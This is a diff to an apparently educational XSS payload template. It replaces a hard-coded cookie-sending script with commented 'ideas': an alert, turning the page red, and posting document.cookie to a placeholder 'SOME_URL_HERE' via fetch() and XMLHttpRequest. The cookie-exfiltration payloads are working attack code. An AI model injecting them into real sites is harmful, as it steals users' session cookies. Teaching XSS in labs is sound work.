@@ -1,7 +1,27 @@
 <script>
-var xhr = new XMLHttpRequest();
-//xhr.open("POST", "http://some-site.com/some-secret-place", true);
-xhr.open("POST", "http://localhost:2222", true);
-xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-xhr.send("cookie="+document.cookie);
+  // Idea 1:  Example scripts you can try to run
+  alert("hello"); // Display a message in the user's browser
+
+  // Idea 2:  Modify the web page's layout to do bad things
+  // (this example:  turn the page background red)
+  function changeBackground(color) {
+   document.body.style.background = color;
+  }
+  window.addEventListener("load",function() { changeBackground('red') });
+
+  // Idea 3:  Send something to a remote site (eg. webhook) using fetch()
+  // More info:  https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch
+  fetch("https://SOME_URL_HERE", {
+      "body": "Hello!  My cookie is:  " + document.cookie,
+      "method": "post",
+  }).await;
+
+  // Idea 3 (alternate version):  Send some info to a site using XMLHttpRequest (XHR)
+  // This is an older alternative to fetch()
+  // More info:  https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "http://SOME_URL_HERE", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+  xhr.send("cookie="+document.cookie);
+
 </script>
